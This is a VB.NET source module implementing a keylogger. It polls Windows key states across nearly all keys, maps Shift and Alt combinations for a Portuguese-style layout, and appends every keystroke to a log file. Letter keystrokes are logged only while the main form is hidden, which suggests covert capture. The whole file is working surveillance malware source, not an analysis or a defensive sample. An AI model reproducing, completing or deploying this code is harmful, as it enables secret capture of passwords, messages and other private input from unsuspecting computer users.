Module mdlKeyboard

    ' Variable SyncKeyboard 
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
    Public Const sk As Integer = 16
    Public result As Integer
    Public rs As Integer
    Public letter As String

    ' Method to detect Keyboard Keys
    ' @params log (String): Path of log file to update
    ' - 1. Detect letter Key
    ' - 2. Detect all rest of Characters
    Public Sub SyncKeyboard(log As String)
        ' - 1. Detect letter Key
        Dim i As Integer
        letter = Nothing
        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                letter = Chr(i)
                ' TESTE
                ' MsgBox("Letter: " & letter & " / i: " & i, MsgBoxStyle.Information, "ID")
                Exit For
            End If
        Next i
        ' - 2. Detect all rest of Characters
        rs = GetAsyncKeyState(188)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, ";", ","), True)
        End If
        rs = GetAsyncKeyState(189)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "_", "-"), True)
        End If
        rs = GetAsyncKeyState(190)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, ":", "."), True)
        End If
        rs = GetAsyncKeyState(191)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "^", "~"), True)
        End If
        rs = GetAsyncKeyState(192)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "Ç", "ç"), True)
        End If
        rs = GetAsyncKeyState(186)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "`", "´"), True)
        End If
        rs = GetAsyncKeyState(187)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "*", "+"), True)
        End If
        rs = GetAsyncKeyState(219)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "?", "'"), True)
        End If
        rs = GetAsyncKeyState(221)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "»", "«"), True)
        End If
        rs = GetAsyncKeyState(226)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, ">", "<"), True)
        End If
        rs = GetAsyncKeyState(220)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "|", "\"), True)
        End If
        rs = GetAsyncKeyState(222)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(log, IIf(rs < 0, "ª", "º"), True)
        End If
        rs = GetAsyncKeyState(109)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "-", True)
        End If
        rs = GetAsyncKeyState(91)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WINDOWS)", True)
        End If
        rs = GetAsyncKeyState(173)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MUTE)", True)
        End If
        rs = GetAsyncKeyState(112)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F1)", True)
        End If
        rs = GetAsyncKeyState(178)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MUSIC STOP)", True)
        End If
        rs = GetAsyncKeyState(177)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MUSIC BACKWARD)", True)
        End If
        rs = GetAsyncKeyState(176)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MUSIC FORWARD)", True)
        End If
        rs = GetAsyncKeyState(179)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MUSIC PLAY)", True)
        End If
        rs = GetAsyncKeyState(174)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(SOUND REDUCE)", True)
        End If
        rs = GetAsyncKeyState(175)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(SOUND INCREASE)", True)
        End If
        rs = GetAsyncKeyState(182)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MY COMPUTER)", True)
        End If
        rs = GetAsyncKeyState(183)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(CALCULATOR)", True)
        End If
        rs = GetAsyncKeyState(181)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WINDOWS MEDIA PLAYER)", True)
        End If
        rs = GetAsyncKeyState(170)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(SEARCH)", True)
        End If
        rs = GetAsyncKeyState(180)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(MAIL)", True)
        End If
        rs = GetAsyncKeyState(172)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WEB HOME)", True)
        End If
        rs = GetAsyncKeyState(168)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WEB REFRESH)", True)
        End If
        rs = GetAsyncKeyState(169)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WEB ABORT)", True)
        End If
        rs = GetAsyncKeyState(167)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WEB FORWARD)", True)
        End If
        rs = GetAsyncKeyState(166)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(WEB BACKWARD)", True)
        End If
        rs = GetAsyncKeyState(113)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F2)", True)
        End If
        rs = GetAsyncKeyState(114)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F3)", True)
        End If
        rs = GetAsyncKeyState(115)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F4)", True)
        End If
        rs = GetAsyncKeyState(116)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F5)", True)
        End If
        rs = GetAsyncKeyState(117)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F6)", True)
        End If
        rs = GetAsyncKeyState(118)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F7)", True)
        End If
        rs = GetAsyncKeyState(119)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F8)", True)
        End If
        rs = GetAsyncKeyState(120)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F9)", True)
        End If
        rs = GetAsyncKeyState(121)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F10)", True)
        End If
        rs = GetAsyncKeyState(122)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F11)", True)
        End If
        rs = GetAsyncKeyState(123)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(F12)", True)
        End If
        rs = GetAsyncKeyState(106)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "*", True)
        End If
        rs = GetAsyncKeyState(111)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "/", True)
        End If
        rs = GetAsyncKeyState(110)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, ".", True)
        End If
        rs = GetAsyncKeyState(107)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "+", True)
        End If
        rs = GetAsyncKeyState(144)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(NUM LOCK)", True)
        End If
        rs = GetAsyncKeyState(96)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "0", True)
        End If
        rs = GetAsyncKeyState(97)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "1", True)
        End If
        rs = GetAsyncKeyState(98)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "2", True)
        End If
        rs = GetAsyncKeyState(99)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "3", True)
        End If
        rs = GetAsyncKeyState(100)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "4", True)
        End If
        rs = GetAsyncKeyState(101)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "5", True)
        End If
        rs = GetAsyncKeyState(102)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "6", True)
        End If
        rs = GetAsyncKeyState(103)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "7", True)
        End If
        rs = GetAsyncKeyState(104)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "8", True)
        End If
        rs = GetAsyncKeyState(105)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "9", True)
        End If
        rs = GetAsyncKeyState(145)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(log, "(SCROLL LOCK)", True)
        End If
        If frmMain.Visible = True Then
        Else
            If letter <> Nothing Then
                If My.Computer.Keyboard.AltKeyDown And letter = "2" Then
                    My.Computer.FileSystem.WriteAllText(log, "@", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "3" Then
                    My.Computer.FileSystem.WriteAllText(log, "£", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "4" Then
                    My.Computer.FileSystem.WriteAllText(log, "§", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "5" Then
                    My.Computer.FileSystem.WriteAllText(log, "€", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "7" Then
                    My.Computer.FileSystem.WriteAllText(log, "{", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "8" Then
                    My.Computer.FileSystem.WriteAllText(log, "[", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "9" Then
                    My.Computer.FileSystem.WriteAllText(log, "]", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "0" Then
                    My.Computer.FileSystem.WriteAllText(log, "}", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "1" Then
                    My.Computer.FileSystem.WriteAllText(log, "!", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "2" Then
                    My.Computer.FileSystem.WriteAllText(log, """", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "3" Then
                    My.Computer.FileSystem.WriteAllText(log, "#", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "4" Then
                    My.Computer.FileSystem.WriteAllText(log, "$", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "5" Then
                    My.Computer.FileSystem.WriteAllText(log, "%", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "6" Then
                    My.Computer.FileSystem.WriteAllText(log, "&", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "7" Then
                    My.Computer.FileSystem.WriteAllText(log, "/", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "8" Then
                    My.Computer.FileSystem.WriteAllText(log, "(", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "9" Then
                    My.Computer.FileSystem.WriteAllText(log, ")", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "0" Then
                    My.Computer.FileSystem.WriteAllText(log, "=", True)
                ElseIf i = 16 Then
                    My.Computer.FileSystem.WriteAllText(log, "(SHIFT)", True)
                ElseIf i = 17 Then
                    My.Computer.FileSystem.WriteAllText(log, "(CTRL)", True)
                ElseIf i = 2 Then
                    My.Computer.FileSystem.WriteAllText(log, "(RIGHT MOUSE)", True)
                ElseIf i = 8 Then
                    My.Computer.FileSystem.WriteAllText(log, "(BACKSPACE)", True)
                ElseIf i = 9 Then
                    My.Computer.FileSystem.WriteAllText(log, "(TAB)", True)
                ElseIf i = 4 Then
                    My.Computer.FileSystem.WriteAllText(log, "(MIDDLE MOUSE)", True)
                ElseIf i = 5 Then
                    My.Computer.FileSystem.WriteAllText(log, "(MOUSE 4)", True)
                ElseIf i = 6 Then
                    My.Computer.FileSystem.WriteAllText(log, "(MOUSE 5)", True)
                ElseIf i = 44 Then
                    My.Computer.FileSystem.WriteAllText(log, "(PRINTSCREEN)", True)
                ElseIf i = 33 Then
                    My.Computer.FileSystem.WriteAllText(log, "(PAGEUP)", True)
                ElseIf i = 34 Then
                    My.Computer.FileSystem.WriteAllText(log, "(PAGEDOWN)", True)
                ElseIf i = 35 Then
                    My.Computer.FileSystem.WriteAllText(log, "(END)", True)
                ElseIf i = 45 Then
                    My.Computer.FileSystem.WriteAllText(log, "(INSERT)", True)
                ElseIf i = 36 Then
                    My.Computer.FileSystem.WriteAllText(log, "(HOME)", True)
                ElseIf i = 46 Then
                    My.Computer.FileSystem.WriteAllText(log, "(DELETE)", True)
                ElseIf i = 20 Then
                    My.Computer.FileSystem.WriteAllText(log, "(CAPSLOCK)", True)
                ElseIf i = 46 Then
                    My.Computer.FileSystem.WriteAllText(log, "(DELETE)", True)
                ElseIf i = 18 Then
                    My.Computer.FileSystem.WriteAllText(log, "(ALT)", True)
                ElseIf i = 19 Then
                    My.Computer.FileSystem.WriteAllText(log, "(PAUSE)", True)
                ElseIf i = 27 Then
                    My.Computer.FileSystem.WriteAllText(log, "(ESC)", True)
                ElseIf i = 37 Then
                    My.Computer.FileSystem.WriteAllText(log, "(LEFT)", True)
                ElseIf i = 39 Then
                    My.Computer.FileSystem.WriteAllText(log, "(RIGHT)", True)
                ElseIf i = 38 Then
                    My.Computer.FileSystem.WriteAllText(log, "(UP)", True)
                ElseIf i = 40 Then
                    My.Computer.FileSystem.WriteAllText(log, "(DOWN)", True)
                ElseIf i = 12 Then
                    My.Computer.FileSystem.WriteAllText(log, "(PAGE BREAK)", True)
                ElseIf i = 13 Then
                    My.Computer.FileSystem.WriteAllText(log, "(ENTER)" & vbNewLine, True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                    My.Computer.FileSystem.WriteAllText(log, letter, True)
                Else
                    My.Computer.FileSystem.WriteAllText(log, letter.ToLower, True)
                End If
            End If
        End If
    End Sub

End Module
